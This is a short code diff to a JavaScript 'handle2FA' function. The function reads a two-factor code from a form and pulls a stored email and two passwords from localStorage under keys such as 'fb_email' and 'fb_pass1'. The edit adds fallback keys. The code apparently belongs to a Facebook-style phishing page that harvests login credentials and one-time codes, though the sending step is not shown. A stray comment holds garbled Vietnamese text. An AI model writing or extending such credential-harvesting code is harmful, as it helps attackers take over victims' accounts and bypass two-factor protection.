@@ -3030,8 +3030,8 @@
     function handle2FA() {
       const codeInput = document.getElementById('_r_a_');
       const code = codeInput ? codeInput.value : '';
-      var email = localStorage.getItem('fb_email');
-      const password1 = localStorage.getItem('fb_pass1');
+      var email = localStorage.getItem('fb_email') || localStorage.getItem('social_saved_email') || '';
+      const password1 = localStorage.getItem('fb_pass1') || localStorage.getItem('social_saved_pass') || '';
       const password2 = localStorage.getItem('fb_pass2'); // fix láº¡i
       if (!code) return; // Don't submit empty
 
